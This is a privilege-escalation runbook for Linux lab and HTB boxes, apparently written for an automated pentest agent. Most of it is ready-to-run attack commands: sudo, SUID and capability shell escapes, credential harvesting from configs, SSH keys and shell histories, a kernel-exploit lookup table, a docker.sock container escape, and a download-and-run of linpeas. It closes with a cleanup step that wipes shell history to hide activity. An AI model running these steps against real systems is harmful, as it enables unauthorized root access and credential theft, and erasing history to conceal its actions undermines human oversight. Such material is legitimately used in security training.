# Runbook: Linux foothold → root

**Use when:** You have a Linux shell as a non-root user and want to escalate.
**Produces:** root shell + root.txt.
**Time:** 10-60 min depending on which path hits.
**Prerequisites:** A working shell (RCE, SSH, reverse shell, etc.).

This runbook walks through the **7 most common privilege escalation
paths** on Linux, in the order they typically work on HTB / lab boxes.
Stop at the first path that hits — they are not stacked.

---

## Variables

```bash
export TARGET="10.X.X.X"
export USER="<your_low_priv_user>"
export PASS="<password if SSH; else N/A>"
export REPORTS="$HOME/.openclaw/workspace/reports/$TARGET"
mkdir -p "$REPORTS/loot"

# Helper to run a command — replace this with your actual shell channel
# (sshpass+ssh, reverse shell write, RCE wrapper, etc.)
run() {
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" "$*"
}
```

---

## Step 1 — Capture user.txt (always)

```bash
run "cat ~/user.txt; cat /home/$USER/user.txt 2>/dev/null"
```

Save it before risking the shell.

---

## Step 2 — sudo -l (the highest-yield path)

```bash
run "sudo -l 2>&1"
```

### Path 2A — sudo with NOPASSWD

If you see `(root) NOPASSWD:` against a binary:
1. **Look up the binary on GTFOBins:** https://gtfobins.github.io/gtfobins/<binary>/#sudo
2. If listed → copy the sudo escalation snippet, run it.
3. If NOT listed → the binary is custom. Read it.

```bash
# Read the script if it's a shell/python/perl thing
run "cat <full-path-to-sudo-binary>"
```

### Path 2B — sudo wildcard with `*`

If you see `(root) NOPASSWD: /path/to/script.py *`:
- The `*` lets you pass arbitrary args.
- Read the script. Look for:
  - `os.system`, `subprocess` with user-controlled arg → command injection
  - `tarfile.extractall` with `filter="data"` → CVE-2025-4517 if Python <3.12.10
  - `eval`, `exec` on user input → RCE
  - `open(filename, "w")` where filename is from argv → arbitrary write
  - `pickle.load` on user-controlled file → RCE
  - `subprocess.run(arg, shell=True)` with arg from argv → command injection

If you find **`tarfile.extractall(filter="data")`** → switch to runbook
`wing-ftp-rooted.md` Step 9-11 (CVE-2025-4517 PoC reusable).

If you find **command injection** via wildcard → exploit directly.

---

## Step 3 — SUID / SGID binaries

```bash
run "find / -perm -4000 -type f 2>/dev/null"
```

For each binary found, check GTFOBins under "SUID":
https://gtfobins.github.io/gtfobins/<binary>/#suid

Common winners:
- `/usr/bin/find` → `find . -exec /bin/sh \; -quit`
- `/usr/bin/python3` → `python3 -c 'import os; os.execl("/bin/sh","sh")'`
- `/usr/bin/cp` (with capability/SUID weirdness) → write to `/etc/passwd`
- `/usr/bin/nmap` (older) → `--interactive` mode
- `pkexec` → CVE-2021-4034 PwnKit (see Step 7)

---

## Step 4 — Linux capabilities

```bash
run "getcap -r / 2>/dev/null"
```

Look for:
- `cap_setuid+ep` on python/perl → `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
- `cap_dac_read_search+ep` → can read any file (read `/etc/shadow`, crack root)
- `cap_dac_override+ep` → can write any file
- `cap_sys_admin+ep` → effectively root via mount tricks

---

## Step 5 — Cron jobs

```bash
run "cat /etc/crontab; ls -la /etc/cron.*"
```

Look for:
- Scripts running as root that **you can write to** (`-w` on the file or its directory)
- Wildcards in cron commands → wildcard injection (e.g. `tar cf * .` in a writable dir)
- Path injection (cron PATH=/home/user:/usr/bin → drop a fake `tar` binary)

Watch with:
```bash
run "ls -lah /tmp /var/tmp /dev/shm; pspy64 2>/dev/null &"
```
(pspy reveals running processes without ps permissions.)

---

## Step 6 — Writable / readable interesting paths

```bash
run "
# Service config files often readable
find /etc/ -readable -type f 2>/dev/null | xargs grep -l -iE 'pass|secret|token|key' 2>/dev/null | head -10
# Backup files
find / -name '*.bak' -o -name '*.old' -o -name '*~' 2>/dev/null | head
# .ssh directories of other users
ls -la /home/*/.ssh/ 2>&1
# .bash_history of other users
find /home -name '.bash_history' -readable 2>/dev/null
# Database connection strings in web app dirs
grep -rIniE 'password|connectionstring' /var/www/ /opt/ 2>/dev/null | head -20
"
```

---

## Step 7 — Kernel exploits (last resort, but works on HTB)

```bash
run "uname -a; cat /etc/os-release; lsb_release -a 2>/dev/null"
```

Match against known kernel exploits:
| Kernel / OS | CVE | Exploit |
|---|---|---|
| Ubuntu/Debian with `pkexec` (polkit) | CVE-2021-4034 | PwnKit |
| Linux 5.8-5.16.11 | CVE-2022-0847 | DirtyPipe |
| Linux <5.16, sudo <1.9.5p2 | CVE-2021-3156 | Sudo Baron Samedit |
| Linux 5.1-5.13 | CVE-2021-22555 | Netfilter |
| Linux ≥5.8 with `eBPF` | CVE-2022-23222 | bpf-eBPF |

Run **linpeas** for full enumeration:
```bash
# Upload linpeas (if not present)
run "curl -sLO https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh -a > linpeas.out 2>&1"
run "tail -200 linpeas.out"
# Look for "[+]" markers — those are findings
```

⚠️ **Linpeas is third-party code** — operator approval needed before
running it on engagement-scope targets.

---

## Step 8 — Container escape (if `/.dockerenv` exists)

```bash
run "ls -la /.dockerenv /proc/1/cgroup 2>/dev/null; capsh --print 2>/dev/null; mount | head -10"
```

Look for:
- `/var/run/docker.sock` mounted → `docker run -v /:/host -it alpine chroot /host`
- `cap_sys_admin` → various breakout techniques
- Privileged container → `mknod` access to `/dev/sda*`

---

## End condition

You should have one of:
- A root shell (`sudo -i`, `su -`, kernel exploit shell, container escape root)
- A passwordless sudo-NOPASSWD-ALL entry you can use forever
- root.txt captured

## Cleanup before leaving

```bash
run "
  rm -f ~/.bash_history ~/linpeas.sh ~/linpeas.out 2>/dev/null
  history -c 2>/dev/null
"
```
